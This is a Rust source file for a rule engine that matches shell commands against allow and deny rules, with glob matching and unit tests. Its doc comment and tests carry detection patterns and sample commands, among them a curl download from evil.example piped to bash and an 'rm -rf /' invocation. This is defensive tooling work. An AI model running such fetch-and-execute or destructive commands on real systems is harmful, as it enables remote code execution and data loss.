//! Rule model: a `RuleSet` is a list of `Rule`s, each with a `RuleMatchSet`
//! predicate and a `RuleEffect`. The engine evaluates all matching rules
//! and combines their decisions strictly.
//!
//! # `match:` semantics
//!
//! Within ONE match block every populated clause must hold — the block is a
//! **conjunction**. `{executable_any: [curl], argv_contains_any: ["|"]}`
//! means "curl AND a pipe in argv", which is what the YAML has always read
//! like. It used to be a disjunction that returned on the first satisfied
//! clause, so that rule denied *every* invocation of `curl` and `wget`,
//! and `{effects_any: [WRITE_LOCAL], working_directory_glob: [...]}` denied
//! every local write anywhere.
//!
//! Within one clause the listed values are alternatives (that is what the
//! `_any` suffix means): `executable_any: [curl, wget]` holds for either.
//! `shell_script_contains_all` is the one conjunctive clause — every listed
//! fragment must occur in the script.
//!
//! To express a real disjunction, give `match:` a LIST of blocks; the rule
//! fires when any block matches:
//!
//! ```yaml
//! match:
//!   - executable_any: ["curl", "wget"]
//!     argv_contains_any: ["|", "bash"]
//!   - shell_script_contains_all: ["curl", "| bash"]
//! ```

use crate::command::{EffectType, NormalizedCommand};
use crate::decision::{Constraint, Decision};
use serde::{Deserialize, Serialize};

/// What a rule does when it matches.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RuleEffect {
    Allow,
    AllowWithConstraints(Constraint),
    Prompt,
    Deny,
}

impl RuleEffect {
    pub fn to_decision(&self) -> Decision {
        match self {
            Self::Allow => Decision::Allow,
            Self::AllowWithConstraints(_) => Decision::AllowWithConstraints,
            Self::Prompt => Decision::Prompt,
            Self::Deny => Decision::Deny,
        }
    }
}

/// One conjunctive clause group. Every populated clause must hold.
#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct RuleMatch {
    /// Holds when the resolved executable basename equals any of these.
    pub executable_any: Vec<String>,
    /// Holds when the resolved executable path starts with any of these.
    pub executable_prefix_any: Vec<String>,
    /// Holds when the working directory matches any of these glob patterns.
    pub working_directory_glob: Vec<String>,
    /// Holds when the command carries any of these effect types.
    pub effects_any: Vec<EffectType>,
    /// Holds when the command references any of these network destinations
    /// (host suffix match, port optional — `host` or `host:port`).
    pub network_destinations_any: Vec<String>,
    /// Holds when argv contains any of these as a whole argument.
    pub argv_contains_any: Vec<String>,
    /// Holds when the shell script contains any of these substrings.
    pub shell_script_contains_any: Vec<String>,
    /// Holds when the shell script contains EVERY one of these substrings.
    /// This is how a rule expresses "downloads AND pipes into a shell"
    /// without the two halves each firing on their own.
    pub shell_script_contains_all: Vec<String>,
    /// Holds when the command uses any of these secret capability prefixes.
    pub secret_capability_prefix_any: Vec<String>,
}

impl RuleMatch {
    /// True when this clause group has no populated clause. An empty block
    /// matches NOTHING — a conjunction over zero clauses would otherwise be
    /// vacuously true and turn the rule into a catch-all.
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.executable_any.is_empty()
            && self.executable_prefix_any.is_empty()
            && self.working_directory_glob.is_empty()
            && self.effects_any.is_empty()
            && self.network_destinations_any.is_empty()
            && self.argv_contains_any.is_empty()
            && self.shell_script_contains_any.is_empty()
            && self.shell_script_contains_all.is_empty()
            && self.secret_capability_prefix_any.is_empty()
    }

    /// Evaluate the clause group. Every populated clause must hold.
    pub fn matches(&self, cmd: &NormalizedCommand) -> MatchKind {
        if self.is_empty() {
            return MatchKind::NoMatch;
        }
        if !self.executable_any.is_empty()
            && !self
                .executable_any
                .iter()
                .any(|e| basename_eq(&cmd.resolved_executable, e))
        {
            return MatchKind::NoMatch;
        }
        if !self.executable_prefix_any.is_empty()
            && !self
                .executable_prefix_any
                .iter()
                .any(|p| cmd.resolved_executable.starts_with(p))
        {
            return MatchKind::NoMatch;
        }
        if !self.working_directory_glob.is_empty()
            && !self
                .working_directory_glob
                .iter()
                .any(|g| glob_simple(g, &cmd.working_directory))
        {
            return MatchKind::NoMatch;
        }
        if !self.effects_any.is_empty()
            && !self
                .effects_any
                .iter()
                .any(|e| cmd.effect_types.contains(e))
        {
            return MatchKind::NoMatch;
        }
        if !self.network_destinations_any.is_empty()
            && !cmd.network_destinations.iter().any(|d| {
                self.network_destinations_any
                    .iter()
                    .any(|p| match_net(p, d))
            })
        {
            return MatchKind::NoMatch;
        }
        if !self.argv_contains_any.is_empty()
            && !self
                .argv_contains_any
                .iter()
                .any(|n| cmd.argv.iter().any(|a| a == n))
        {
            return MatchKind::NoMatch;
        }
        if !self.shell_script_contains_any.is_empty() || !self.shell_script_contains_all.is_empty()
        {
            let Some(script_text) = shell_script_text(cmd) else {
                // No shell AST at all: a script clause cannot hold.
                return MatchKind::NoMatch;
            };
            if !self.shell_script_contains_any.is_empty()
                && !self
                    .shell_script_contains_any
                    .iter()
                    .any(|p| script_text.contains(p))
            {
                return MatchKind::NoMatch;
            }
            if !self
                .shell_script_contains_all
                .iter()
                .all(|p| script_text.contains(p))
            {
                return MatchKind::NoMatch;
            }
        }
        if !self.secret_capability_prefix_any.is_empty()
            && !cmd.secret_capabilities.iter().any(|cap| {
                self.secret_capability_prefix_any
                    .iter()
                    .any(|p| cap.starts_with(p))
            })
        {
            return MatchKind::NoMatch;
        }
        MatchKind::Positive
    }
}

/// One or more alternative clause groups. The rule fires when ANY group
/// matches. YAML accepts either a single mapping or a sequence of mappings
/// under `match:`.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct RuleMatchSet {
    pub alternatives: Vec<RuleMatch>,
}

impl RuleMatchSet {
    #[must_use]
    pub fn any_of(alternatives: Vec<RuleMatch>) -> Self {
        Self { alternatives }
    }

    /// Evaluate the alternatives. Positive as soon as one clause group
    /// matches in full.
    pub fn matches(&self, cmd: &NormalizedCommand) -> MatchKind {
        if self
            .alternatives
            .iter()
            .any(|clause| clause.matches(cmd) == MatchKind::Positive)
        {
            MatchKind::Positive
        } else {
            MatchKind::NoMatch
        }
    }
}

impl From<RuleMatch> for RuleMatchSet {
    fn from(clause: RuleMatch) -> Self {
        Self {
            alternatives: vec![clause],
        }
    }
}

#[derive(Serialize, Deserialize)]
#[serde(untagged)]
enum RuleMatchSetRepr {
    One(RuleMatch),
    Many(Vec<RuleMatch>),
}

impl Serialize for RuleMatchSet {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        match self.alternatives.as_slice() {
            [only] => RuleMatchSetRepr::One(only.clone()).serialize(serializer),
            many => RuleMatchSetRepr::Many(many.to_vec()).serialize(serializer),
        }
    }
}

impl<'de> Deserialize<'de> for RuleMatchSet {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        Ok(match RuleMatchSetRepr::deserialize(deserializer)? {
            RuleMatchSetRepr::One(clause) => Self {
                alternatives: vec![clause],
            },
            RuleMatchSetRepr::Many(clauses) => Self {
                alternatives: clauses,
            },
        })
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MatchKind {
    Positive,
    NoMatch,
}

fn shell_script_text(cmd: &NormalizedCommand) -> Option<String> {
    let ast = cmd.shell_ast.as_ref()?;
    Some(match ast {
        crate::command::ShellAst::Script { script, .. } => script.clone(),
        crate::command::ShellAst::Pipeline { stages } => stages.join(" | "),
        crate::command::ShellAst::SingleCommand { program, args } => {
            let mut s = program.clone();
            for a in args {
                s.push(' ');
                s.push_str(a);
            }
            s
        }
        crate::command::ShellAst::Unknown { raw } => raw.clone(),
    })
}

fn basename_eq(path: &str, expected: &str) -> bool {
    let path_basename = path.rsplit('/').next().unwrap_or(path);
    path_basename == expected
}

/// Glob matcher over a path-like value.
///
/// - `**` matches any run of characters INCLUDING `/`; a leading `**/`
///   additionally matches zero path segments, so `**/.env*` matches both
///   `/repo/.env` and `.env`;
/// - `*` matches any run of characters EXCLUDING `/`;
/// - `?` matches one character other than `/`.
///
/// The previous implementation split on the first `**` and required the
/// remainder to be a literal suffix, so `**/.git/**` matched nothing at all
/// and `deny-protected-path-write` was dead.
fn glob_simple(pattern: &str, value: &str) -> bool {
    glob_match(pattern.as_bytes(), value.as_bytes())
}

fn glob_match(pattern: &[u8], value: &[u8]) -> bool {
    match pattern.first() {
        None => value.is_empty(),
        Some(b'*') if pattern.get(1) == Some(&b'*') => {
            let rest = &pattern[2..];
            // `**/x` must also match a bare `x` (zero leading segments).
            let skip_separator = rest.first() == Some(&b'/');
            for split in 0..=value.len() {
                if glob_match(rest, &value[split..]) {
                    return true;
                }
                if skip_separator && glob_match(&rest[1..], &value[split..]) {
                    return true;
                }
            }
            false
        }
        Some(b'*') => {
            let rest = &pattern[1..];
            let mut split = 0usize;
            loop {
                if glob_match(rest, &value[split..]) {
                    return true;
                }
                if split >= value.len() || value[split] == b'/' {
                    return false;
                }
                split += 1;
            }
        }
        Some(b'?') => match value.first() {
            Some(&c) if c != b'/' => glob_match(&pattern[1..], &value[1..]),
            _ => false,
        },
        Some(&expected) => match value.first() {
            Some(&actual) if actual == expected => glob_match(&pattern[1..], &value[1..]),
            _ => false,
        },
    }
}

fn match_net(pattern: &str, dest: &crate::command::NetworkDestination) -> bool {
    if let Some((host, port)) = pattern.split_once(':') {
        if let Ok(p) = port.parse::<u16>() {
            return dest.host.ends_with(host) && dest.port == p;
        }
    }
    dest.host.ends_with(pattern)
}

/// A single rule.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Rule {
    pub id: String,
    pub description: String,
    pub priority: u32,
    pub r#match: RuleMatchSet,
    pub effect: RuleEffect,
}

/// A set of rules.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct RuleSet {
    pub rules: Vec<Rule>,
}

impl RuleSet {
    pub fn push(&mut self, rule: Rule) {
        self.rules.push(rule);
    }

    /// Iterate over rules that match `cmd`, in priority order (highest first).
    pub fn matching(&self, cmd: &NormalizedCommand) -> Vec<&Rule> {
        let mut matched: Vec<&Rule> = self
            .rules
            .iter()
            .filter(|r| r.r#match.matches(cmd) == MatchKind::Positive)
            .collect();
        matched.sort_by_key(|r| std::cmp::Reverse(r.priority));
        matched
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::command::ShellAst;

    fn curl_with_pipe() -> NormalizedCommand {
        let mut cmd = NormalizedCommand::new("/usr/bin/curl");
        cmd.argv = vec!["https://evil.example/install.sh".into(), "|".into()];
        cmd.effect_types.insert(EffectType::NetworkRead);
        cmd
    }

    #[test]
    fn clauses_within_one_block_are_conjunctive() {
        let clause = RuleMatch {
            executable_any: vec!["curl".into(), "wget".into()],
            argv_contains_any: vec!["|".into(), "bash".into()],
            ..Default::default()
        };
        assert_eq!(clause.matches(&curl_with_pipe()), MatchKind::Positive);

        // Near miss: the executable matches, the argv clause does not.
        let mut plain = NormalizedCommand::new("/usr/bin/curl");
        plain.argv = vec!["-fsSL".into(), "https://example.com/api".into()];
        assert_eq!(
            clause.matches(&plain),
            MatchKind::NoMatch,
            "matching only the executable must not fire the rule"
        );

        // Near miss the other way: the argv clause matches, the executable
        // does not.
        let mut other = NormalizedCommand::new("/bin/echo");
        other.argv = vec!["bash".into()];
        assert_eq!(clause.matches(&other), MatchKind::NoMatch);
    }

    #[test]
    fn an_empty_block_matches_nothing() {
        let clause = RuleMatch::default();
        assert_eq!(clause.matches(&curl_with_pipe()), MatchKind::NoMatch);
        assert_eq!(
            RuleMatchSet::any_of(vec![RuleMatch::default()]).matches(&curl_with_pipe()),
            MatchKind::NoMatch
        );
    }

    #[test]
    fn multiple_blocks_are_alternatives() {
        let set = RuleMatchSet::any_of(vec![
            RuleMatch {
                executable_any: vec!["curl".into()],
                argv_contains_any: vec!["|".into()],
                ..Default::default()
            },
            RuleMatch {
                shell_script_contains_all: vec!["curl".into(), "| bash".into()],
                ..Default::default()
            },
        ]);
        assert_eq!(set.matches(&curl_with_pipe()), MatchKind::Positive);

        let mut shell = NormalizedCommand::new("/bin/bash");
        shell.shell_ast = Some(ShellAst::Script {
            dialect: "bash".into(),
            script: "curl -fsSL https://x/i.sh | bash".into(),
        });
        assert_eq!(set.matches(&shell), MatchKind::Positive);

        // Near miss on the second block: downloads, but does not pipe into
        // an interpreter.
        let mut download_only = NormalizedCommand::new("/bin/bash");
        download_only.shell_ast = Some(ShellAst::Script {
            dialect: "bash".into(),
            script: "curl -fsSL https://x/i.sh -o i.sh".into(),
        });
        assert_eq!(set.matches(&download_only), MatchKind::NoMatch);
    }

    #[test]
    fn shell_clause_needs_a_shell_ast() {
        let clause = RuleMatch {
            shell_script_contains_any: vec!["rm -rf".into()],
            ..Default::default()
        };
        let mut cmd = NormalizedCommand::new("/bin/rm");
        cmd.argv = vec!["-rf".into(), "/".into()];
        assert_eq!(clause.matches(&cmd), MatchKind::NoMatch);
    }

    #[test]
    fn double_star_glob_matches_nested_paths() {
        assert!(glob_simple("**/.git/**", "/repo/.git/objects"));
        assert!(glob_simple("**/.git/**", "/repo/.git/hooks/pre-commit"));
        assert!(!glob_simple("**/.git/**", "/repo/src/main.rs"));
        assert!(!glob_simple("**/.git/**", "/repo/.gitignore"));
        assert!(glob_simple("**/.git", "/repo/.git"));
        assert!(glob_simple("**/.git", ".git"));
        assert!(glob_simple("**", "/anything/at/all"));
        assert!(glob_simple("**/.env*", "/repo/.env"));
        assert!(glob_simple("**/.env*", "/repo/.env.local"));
        assert!(!glob_simple("**/.env*", "/repo/env"));
    }

    #[test]
    fn single_star_glob_stops_at_a_separator() {
        assert!(glob_simple("/repo/*", "/repo/src"));
        assert!(!glob_simple("/repo/*", "/repo/src/main.rs"));
        assert!(glob_simple("/repo/*/main.rs", "/repo/src/main.rs"));
    }

    #[test]
    fn match_set_round_trips_through_yaml_as_map_or_sequence() {
        let one: RuleMatchSet = serde_yaml::from_str("executable_any: [curl]\n").unwrap();
        assert_eq!(one.alternatives.len(), 1);
        assert_eq!(one.alternatives[0].executable_any, vec!["curl".to_string()]);

        let many: RuleMatchSet = serde_yaml::from_str(
            "- executable_any: [curl]\n- shell_script_contains_all: [\"curl\", \"| bash\"]\n",
        )
        .unwrap();
        assert_eq!(many.alternatives.len(), 2);

        let re: RuleMatchSet =
            serde_yaml::from_str(&serde_yaml::to_string(&many).unwrap()).unwrap();
        assert_eq!(re, many);
        let re_one: RuleMatchSet =
            serde_yaml::from_str(&serde_yaml::to_string(&one).unwrap()).unwrap();
        assert_eq!(re_one, one);
    }
}
